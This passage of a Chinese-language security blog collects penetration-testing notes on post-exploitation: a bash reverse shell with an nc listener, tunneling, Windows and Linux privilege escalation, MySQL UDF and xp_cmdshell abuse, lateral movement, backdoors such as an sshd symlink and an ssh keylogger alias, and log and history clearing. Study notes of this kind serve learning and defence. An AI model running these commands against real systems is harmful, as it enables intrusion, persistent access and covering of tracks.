0&gt;&amp;1</code>，控制端<code>nc -lvvp IP:Port</code></p><blockquote><p><code>bash -i</code>表示交互式shell，<code>&gt;&amp;</code>用于混合输出（正确错误信息均反弹回来），<code>/dev/tcp</code>通过此文件与目标建立tcp链接，同理也有UDP</p></blockquote><p>反弹shell类型：</p><ol><li>nc进行正向与反向shell+监听，搭配bash</li><li>Perl、PHP、Ruby、Python进行，MSF中可以生成</li><li>Telnet、OpenSSL</li></ol><hr><h3 id="隧道代理搭建"><a href="#隧道代理搭建" class="headerlink" title="隧道代理搭建"></a>隧道代理搭建</h3><p>通常为HTTP代理与Socks代理，前者仅用于传输Web应用，后者使用tcp协议建立在传输层，可应用于telnet、FTP、SMTP等，此外在最新的Socks5中还支持DNS域名解析与IPv6解析；通常用于与DMZ中的机器建立通道，以便后续对内网的扫描等，如果内网机器能出网就反向shell，否则就正向shell</p><ul><li><p>CS中的SMB beacon：</p><ol><li>先开启CS监听器中的beacon SMB</li><li>生成专用SMB木马</li><li>上传至DMZ区中的Web服务器</li><li>使用<code>cpoy 木马 \\域控IP\C$</code>将木马传到域控中</li><li>创建服务<code>sc \\域控IP create 服务名 binpath=&quot;cme.exe /c 木马&quot;</code></li><li>运行该服务<code>sc \\域控IP start 服务名</code></li><li>CS攻击机link域控</li></ol></li><li><p>Socks代理工具：EarthWorm、FRP、ProxyChain、reGeorg、sSocks、SocksCap64；</p><p>MSF中：<code>nmap -A -T4 -p- --script vuln IP</code>扫描指定内网IP段；其中还有Socks5模块；</p></li><li><p>HTTP代理：支持asp、aspx、php、jsp等；工具：Neo-reGeorg；</p></li><li><p>DNS隧道建立工具Dnscat2，分为中继和直连两种模式；本地浏览器会先找<code>C:\\windows\system\drivers\etc\hosts</code>文件后，没有目标后再去寻找DNS服务器，解析类型如下：</p></li></ul><div class="table-container"><table><thead><tr><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>A/AA</td><td>IPv4/IPv6</td></tr><tr><td>CNAME</td><td>域名的别名</td></tr><tr><td>MX</td><td>smtp邮箱的IP地址</td></tr><tr><td>PTR</td><td>IP反查域名</td></tr><tr><td>NS</td><td>指向一个更大的域名服务器</td></tr><tr><td>SRV</td><td>该服务的IP地址</td></tr></tbody></table></div><ul><li>ICMP隧道：工具Pingtunnel，建立在IP层，最后手段</li></ul><hr><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>可以从系统、开启的应用、服务等入手查找漏洞；包括溢出提权（系统本身）与第三方组件（其他应用）提权；溢出提权又分为本地溢出和远程溢出，后者通过创建用户并上传exp来进行，后者只需要建立连接然后再利用即可</p><p>win：MS06-067、MS08-067、MS10-084、MS11-014、MS11-05、MS12-020、MS16-032；</p><p>Linux：CVE-2017-7308、CVE-2017-6074、CVE-2017-5123、CVE-2016-9793；</p><p>条件：拿到webshell与普通用户权限、具有某些账号与密码、漏洞与exp</p><h4 id="Win下提权"><a href="#Win下提权" class="headerlink" title="Win下提权"></a>Win下提权</h4><p>提权工具：RottenPotato、OriginPotato、SweetPotato、getsystem.exe、RoguePotato；</p><p>wmic命令可以获取杀软、路径、用户组、应用程序、进程等信息，wmic_info.bat脚本进行信息提取，相似的HIGS.bat、winPEAS.bat、Powerless.bat；</p><ul><li><p>内核漏洞：wmic检查版本，powershell列出已安装的安全补丁<code>systeminfo</code>，在<a href="[提权辅助网页 Windows提权辅助 (hacking8.com">相关提权网站</a>](<a href="https://i.hacking8.com/tiquan))查找为进行防护的漏洞">https://i.hacking8.com/tiquan))查找为进行防护的漏洞</a></p></li><li><p>系统服务：可信任服务路径；例如<code>C:\\Program Files\x86</code>如果在<code>C:\\Program</code>下有Program.exe则会去执行后面字符串对应的文件；因为在系统盘下，所以会用相应系统权限去运行；以服务种植该木马，并将该马迁移到其他进程中，防止被发现</p></li><li><p>不安全的服务权限：Java升级、AWVS、windows的升级等都需要系统权限；工具accesschk检查易受攻击的服务</p></li><li><p>注册表权限：工具Subinacl查找是否有不安全的注册表、Autorum可以设置自动启动</p></li><li><p>不安全的文件/文件夹：.msi会以系统的权限开启（需要注册表中<code>Always Install Elevated</code>开启）</p></li></ul><p>msf：<code>getsystem</code>以命名管道进行提权；<code>exploit/windows/local/bypassuac</code>模块可以对uac（用户账户控制）进行绕过；<code>post/multi/recon/local_exploit_Suggester</code>可以检测win-kernel漏洞；<code>exploit/windows/local/unquoted_service_path</code>对可信任服务路径进行利用;<code>~/service_permissions</code>进行不安全服务的利用；<code>~always_install_elevated</code>对.msi安装模块利用；</p><p>CobalStrick中脚本管理可以安装.cna脚本（一整个包）</p><h4 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h4><p>在LAMP中拿到webshell后得到www-data用户，权限极低；</p><p>信息搜集：脚本linpeas.sh</p><div class="table-container"><table><thead><tr><th>信息</th><th>路径</th></tr></thead><tbody><tr><td>系统版本</td><td>/etc/issue；/etc/*-realease</td></tr><tr><td>内核版本</td><td>uname -a/-mrs</td></tr><tr><td>环境变量</td><td>/etc/profile；/etc/bashrc</td></tr><tr><td>网络</td><td>/etc/network/interfaces；/etc/sysconfig/network</td></tr><tr><td>应用与服务</td><td>/etc/services；ps -aux</td></tr><tr><td>计划</td><td>ls -alh；/var/spool/cron</td></tr><tr><td>应用配置</td><td>/etc/apache2/apache2.conf；/my.conf（mysql）；/httpd/conf/httpd.conf（nginx）</td></tr><tr><td>网络通信</td><td>netstat -antup</td></tr><tr><td>Arp缓存</td><td>arp -e</td></tr><tr><td>防火墙</td><td>iptables</td></tr><tr><td>敏感信息</td><td>/etc/passwd；/group；/shadow</td></tr></tbody></table></div><p>拿到相关信息之后，在Exp-db中用Search sploit进行搜集</p><ul><li><p>内核提权：脏牛漏洞CVE-2016-5195（COW竞争条件，适用所有Linux内核2.6.22-3.9之间，32、64位OS）；CVE-2019-13272（适用于内核4.10-5.1.17）；CVE-2022-0874脏管漏洞（匿名管道限制不严格）</p></li><li><p>服务漏洞：dirty_sock（脏袜）漏洞CVE-2019-7304，snap（包管理工具）本地提权（适用于snap版本2.28-2.37，ubuntu18.10/18.04LTS/16.04LTS/14.04LTS）</p></li><li><p>环境变量提权：终端中输入命令，查找PATH进行执行，偷梁换柱</p></li><li><p>Hash：参考1.2中密码文件目录，格式为=用户名:密码:UID:GID:else:用户主目录:默认的shell，如果其中的密码显示x则证明密码存放在/shadow中，格式为=用户名:hash(密码)：x：x：多少天后过期：x：x：过期日期：x</p></li><li><p>sudo滥用：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /etc/sudoers//配置文件</span><br><span class="line"><span class="built_in">sudo</span> /bin/bash;/usr/bin/awk <span class="string">&#x27;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br><span class="line"><span class="built_in">sudo</span> curl file:///etc/shadow</span><br><span class="line">find -<span class="built_in">exec</span> /bin/sh \; -quit</span><br></pre></td></tr></table></figure><ul><li><p>定时任务提权：系统定时任务-/etc/crontab；用户定时任务-/var/spool/cron；<code>crontab</code>查看定时任务（格式=分：时：日：月：周：命令）</p></li><li><p>SUID提权：suid=super uid；该权限作用于可执行文件上，谁执行后谁就成为属主，此时能够继承创建该文件的人的权限，但仅在运行时有用；</p></li><li><p>隐藏文件：.xx（以.开头的为隐藏文件），<code>find / -name &quot;.*&quot; -type f -exec ls -al &#123;&#125;\;2&gt;/dev/null</code></p></li><li><p>NFS提权：NFS网络文件系统，将目标home目录挂载到本地；<code>showmount -e IP</code>显示可挂载的盘—》在/mnt下mkdir—》<code>mount IP:目标 /本地地址</code>—》查找/etc/passwd下相关UID&amp;GID—》创建对应的组和用户（<code>group add -g GID; adduser 名 -uid UID -gid GID</code>），用以使用该身份提权—》（可选）生成ssh，将公钥放置到目标挂载盘中，方便后续进入</p></li></ul><h4 id="数据库应用提权"><a href="#数据库应用提权" class="headerlink" title="数据库应用提权"></a>数据库应用提权</h4><p>SQLmap即可</p><ol><li><p>在MySql中UDF（用户定义函数）存在于mysql/lib/plugin/下，为udf.dll或udf.so；使用数据流ADS在命令行中进行目录创建<code>echo &quot;xx&quot; &gt;名 :: $INDEX_ALLOCATION</code>（mysql&gt;5.1时没有plugin文件，需要自己创建）</p><p><code>select &#39;xxx&#39; into outfile &#39;C:\\名::$INDEX_ALLOCATION&#39;;</code>创建/lib/plugin目录</p><ol><li><p>创建临时表，设置一个BLOB（大型二进制文件）类型</p></li><li><p>插入值CONVERT（udf.dll的16进制，CHAR类型）</p></li><li>将数据库内容导出为<code>C:\mysql\xxx\lib\plugin\udf.dll</code></li><li>删除上述表</li><li><code>create FUNCTION cmdshell returns string soname&#39;udf.dll&#39;;</code></li><li>输入命令<code>select cmdshell(&quot;whoami&quot;);</code></li></ol></li></ol><p>msf中：exploit/multi/mysql/mysql_udf_payload模块</p><ol><li>SQL server：使用<code>net user x x/add &amp; net localgroup administrators x /add</code>增加SA管理员账户，需要sysadmin权限，普通用户无法依靠SQL Server提权（有该权限的话就可以），需要开启xp_cmdshell SQL，语句如下:</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span></span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span></span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">Go</span><br></pre></td></tr></table></figure><p><code>exec master..xp_cmdshell &quot;dos命令&quot;</code>；其他类似存储过程<code>sqlserveragent、sp_oacrate、xp_regwrite</code></p><ol><li>Postgresql：pg_hba.conf具有db的访问权限</li></ol><h4 id="FTP应用提权"><a href="#FTP应用提权" class="headerlink" title="FTP应用提权"></a>FTP应用提权</h4><p>在win下自带的ftp应用中如果权限过高<code>quote site exec net user temp temp /add</code>可以为系统添加temp用户。下面是相关FTP软件的提权</p><ol><li><p>Serv-U</p><ul><li>默认端口43958，默认管理用户<code>LocalAdministrator-#1@ak#.lk;0@P</code>，在webshell一般没有回显，返回状态<code>200 EXEC command successful</code>表示成功，密码保存在Serv-U目录下的<code>ServUAdmin.exe</code>中，Hex打开；</li><li>或者修改配置文件，直接添加FTP用户；<code>ServUDaemon.ini</code>中保存了所有的ftp账户信息</li></ul></li><li><p>G6 FTP</p><ul><li>默认监听端口8021，安装目录下<code>RemoteAdmin/Remote.ini</code>保存着远程管理账户信息，默认以MD5加密。之后使用LXC进行端口转发，本软件不支持远程连接，本地连接成功后新建最高权限FTP用户：</li><li>新建User.bat，并上传，目的是为系统建立一个名为temp，密码为123456的管理员用户</li></ul></li></ol><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">net</span> user temp <span class="number">123456</span> /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators temp /add</span><br></pre></td></tr></table></figure><ol><li><p>FileZilla</p><ul><li>默认端口14147，<code>FileZillaServer Interface.xml</code>保存的是所有FTP管理员信息，<code>FileZillaServer.xml</code>保存服务器所有FTP用户信息；默认情况下也不支持远程连接，同样需要端口转发；建立新用户之后并远程连接后：</li><li>设置新用户路径为C盘—登录FTP将<code>C:\Windows\system32\sethc.exe</code>删除并替换为cmd.exe，也就是粘滞键</li></ul></li><li><p>FlashFXP</p><ul><li>在其安装目录下，<code>Sites.dat、Stats.dat、quick.dat</code>中保留着历史信息—从服务器下载到本地—并复制到本地FlashFXP下替换—进入软件查看，使用星号密码查看器</li></ul></li></ol><h4 id="提权辅助"><a href="#提权辅助" class="headerlink" title="提权辅助"></a>提权辅助</h4><ol><li>3389远程桌面服务端口，RDP远程桌面协议，具体端口位置<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\</code>中的PortNumber属性代表终端连接的端口；防御：强口令、换端口；</li><li>端口转发，工具LCX、reDuh</li><li>启动项提权，参考权限维持</li><li>DLL劫持，工具T00ls Lpk Sethc（利用system32下lpk.dll，因为每个exe运行时都要加载这个，且会判断当前文件夹中是否有该dll，没有则再跑到c盘下找）</li></ol><h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h4><p>打补丁、及时升级、定时杀毒、关闭危险端口、删除System32下敏感的EXE文件、删除不安全组件、安装一些服务器安全配置软件</p><hr><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>横向移动指的是，在攻破Web服务器后，我们能够对其下内网中的其他机器进行访问与文件传输；这里我们通常指的是Win的域下环境</p><p>利用windows内置工具</p><ol><li><p>IPC+Schtasks(计划任务)/AT(老版Schtasks)/SC</p><p>IPC$共享命名管道的资源，用于进程间通信，端口135、445开的时候说明目标有该服务；一般来说域中密码基本一致，由域控管理，获得账户密码后，我们对域控进行横向操作</p><ol><li><code>net use \\域控IP\ipc$ /user:账号 &quot;密码&quot;</code>通常使用管理员账号，此时我们可以向域控进行文件传输，方便后续操作</li></ol></li><li><p>SC创建服务执行<code>SC //IP createtest binpath=&quot; &quot; obj=&quot; &quot; password=&quot; &quot;</code></p></li><li><p>WMIC：<code>wmic /node:IP /user:用户 /password:密码 process call</code></p></li><li><p>WinRM：远程管理服务，默认监听5985-http、5986-https</p></li></ol><p>利用外置工具</p><ol><li><p>PsExec.exe、PsExec.py,搭配smbexec.py</p></li><li><p>Wmiexec.vbs（csscript.exe）、wmcmd.exe、wmiHacker（免杀，445端口）</p></li><li><p>pth-winexe：kali自带pth工具集；</p><p>msf中<code>auxiliary/admin/smb/psexec_command</code>模块&amp;<code>exploit/windows/smb/psexec</code>模块；<code>auxiliary/admin/smb/ms17_010_command</code></p></li><li><p>Token窃取：</p><p>win中包括授权D令牌（交互式会话登录）和模拟I令牌（非交互会话），均会在重启之后清除，D令牌所有者注销之后转换为I令牌；</p><p>MSF中<code>load incognito</code>，ms14-068实现域内提权</p><p>CS中hashdump、logonpasswords可用于获取凭证，Portscan可以扫描存活主机，也可以手动引入incognito.exe</p></li><li><p>SharpRDP：impacket套件</p></li></ol><p><strong>域内横向移动</strong>：</p><p>win的认证机制：本地认证、网络认证、域认证；</p><p>在网络认证中主要用于_质询（chalenge&amp;response）_协议（NTLM v1/v2/session v2）；具体步骤如下;</p><ol><li>客户端向服务端发送请求，</li><li>服务端对客户端验证确实有该用户后，随机生成challenge，再challenge1=hash(用户名，challenge)存到内存，返回challenge</li><li>客户端收到challenge通过协商好的算法进行response=hash(用户名，challenge)</li><li>客户端发送response与服务端的challenge1对比验证</li></ol><p>域认证基于Kerberos协议：客户向KDC申请，KDC中的AS（检查服务）进行检查生成AD，验证成功之后返回TGT给客户；如果客户想要访问特定服务器需要再次向KDC申请，其中的TGS判断权限合格后返回特定的Ticket</p><div class="table-container"><table><thead><tr><th>名称</th><th>作用</th></tr></thead><tbody><tr><td>Ticket</td><td>凭证</td></tr><tr><td>KDC</td><td>密钥分发中心</td></tr><tr><td>TGT</td><td>生成凭证，在内存中</td></tr><tr><td>AD</td><td>存储NTLM hash</td></tr><tr><td>TGS</td><td>票据授予服务</td></tr></tbody></table></div><p>PTH：哈希传递攻击（445端口、SMB、admin$共享）；msf中<code>auxiliary/admin/smb/psexec_command</code>和用于域和工作组的<code>exploit/windows/smb/psexec</code>；minikatz、powershell、CS、Impacket套件中的wmiexec.py&amp;smbexec.py均可以用于PTH；</p><p>其他还有PTK密钥传递攻击、PTT票据传递攻击</p><hr><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><h4 id="Win下权限维持"><a href="#Win下权限维持" class="headerlink" title="Win下权限维持"></a>Win下权限维持</h4><p>后门安装包含注册表后门（persistence）&amp;服务后门（metsvc）【msf模块】</p><ol><li><p>首先上传vbs，修改为自启动，无需认证</p></li><li><p><code>run metsvc -A</code>设置上述脚本为开机自启动服务型后门（31337端口）</p><p><code>use exploit/multi/handler</code>&amp;<code>set payload windows/metsvc_bind_tcp</code></p></li><li><p>AutorunScript获取shell时自动执行该持续化脚本</p></li></ol><ul><li><p>系统工具替换后门（开机辅助工具）：narrator讲述人劫持、utilman辅助工具管理器等。</p></li><li><p>shift后门：登录windows时，按5次shift，将粘滞键</p></li></ul><p>msf相关利用<code>post/windows/manage/sticky_keys</code>；原理：注册表=<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>下寻找目标替换应用，添加<code>debugger</code>参数，将其赋值为后门木马路径</p><p>同理可以更改Notepad，为其添加参数，使得Notepad退出之后能够后台运行后门木马。</p><p>开机自启动注册表项：先后顺序如下</p><p><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>—&gt;<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>—&gt;<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>—&gt;<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></p><p>此外<code>\RunOne \RunServiceOnce \Runservices</code>只执行一次</p><p>其他方式：</p><ul><li><p>快捷方式劫持，更改目标文件位置</p></li><li><p>账户隐藏xxx$（net user无法看到，但控制面板能看）</p></li><li><p>后门账号/克隆账号（控制面板看不到但注册表一定能看）：</p><ol><li>创建$用户到admin组中</li><li>admin对应的F值赋值给<script type="math/tex">`用户（导出`</script>用户的键值和F值以及admin的F值）</li><li>将admin（F）赋值给$（F），之后删除<code>$</code>用户</li><li>导入<code>$</code>用户的F和键值</li></ol></li><li><p>文件夹启动：<code>C:\Users\Lenovo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></p></li><li><p>服务后门：一般情况下杀软会进行拦截（Task-powershell脚本）</p></li></ul><h4 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h4><ul><li><p>软链接sshd：<code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oport=12345</code></p><ol><li><code>ssh root@IP -p 12345</code>输入任何密码就可以root登录</li></ol></li><li><p>ssh server wrapper：<code>ssh-keygen -t rsa</code>将公钥送到目标靶机上</p></li><li><p>ssh key logger：在靶机.bashrc中添加<code>alias ssh=&#39;strace -o /tmp/sshpwd -&#39;date+%d%h%m%s&#39;.log -e read,write,connect -s2048 ssh&#39;</code>输入的所有键盘记录都会在log中存储</p></li><li><p>Vim中默认含有python扩展</p></li><li><p>alias后门：键盘记录；Crontab后门：定时任务</p></li><li><p>setuid：使文件打开者在使用时拿到所有者权限</p><p>setgid：作用于目录，用户打开该目录后自动加入到该目录所属组</p></li><li><p>文件隐藏touch文件，隐藏权限<code>chattr +i/-i</code>给所属文件加锁用于防止删除</p></li><li>命令无痕模式：<code>set +o history</code>（上下键还有，history命令看不出来）</li><li>删除命令历史：<code>sed -i 100,$d,bash_history</code>删除100行之后的命令；指定行<code>history -d 100</code></li></ul><h4 id="域内权限维持"><a href="#域内权限维持" class="headerlink" title="域内权限维持"></a>域内权限维持</h4><ul><li>黄金票据伪造（PTT）</li></ul><p>条件：域名称+域SID+域的KRBTGT的账号密码的hash+伪造用户</p><blockquote><p>whoami &amp; minikatz lasdump::dcsync /user:krbtge@域名</p></blockquote><ul><li>minikatz中的Skeleton key</li></ul><p>无需重启，适用于winServer03-12（万能密码，不能该用户，默认‘minikatz’），权限在重新启动之后失效，需要安装<code>privilege::debug &amp;&amp; misc::skeleton</code></p><ul><li>SID history</li></ul><p>用于跟踪安全主体控制用户连接资源时的访问权限：当用户从A域到B域时，SID会变，但是SID History中会保留在A域中的权限；minikatz中<code>privilege::debug &amp;&amp; sid::patch &amp;&amp; sid::add /sam::名 /new:adminstrator</code></p><hr><h3 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h3><ul><li>windows</li></ul><p>日志位置<code>C:\Windows\System32\winevt\Logs</code>||在win+r中键入<code>eventwr.msc</code>；该日志使用事件查看器打开，包含：应用程序运行记录（Application）、安全账号改动等（Security）、系统驱动和软件崩溃等（System）、设置setup、转发事件；</p><p>wevtutil.exe用于检索、删除、导出等对日志的操作</p><p>msf：<code>net user username /del</code>删除账号，<code>clearv</code>删除日志，<code>sessions -k</code>关闭所有的meterpreter，<code>run event_manager -i/-c</code>i看日志c删除日志</p><p>停止记录日志：ps脚本的Invoke-phantOm，eventlog-&gt; svchost执行</p><ul><li>Linux（）</li></ul><div class="table-container"><table><thead><tr><th>路径</th><th>记录内容</th><th>查看命令</th></tr></thead><tbody><tr><td>/var/log/wtmp</td><td>所有成功的登录记录</td><td>last</td></tr><tr><td>/var/log/btmp</td><td>所有的失败的登陆记录</td><td>lastb（无法修改，在root下删除）</td></tr><tr><td>/var/log/lastlog</td><td>最近登陆记录</td><td>lastlog</td></tr><tr><td>/var/run/utmp</td><td>当前登录用户的信息</td><td>who</td></tr><tr><td>/var/log/httpd/access.log</td><td>nginx日志</td><td></td></tr><tr><td>/var/log/cron</td><td>定时任务日志</td><td></td></tr><tr><td>/var/log/secure</td><td>授权、账户信息等</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
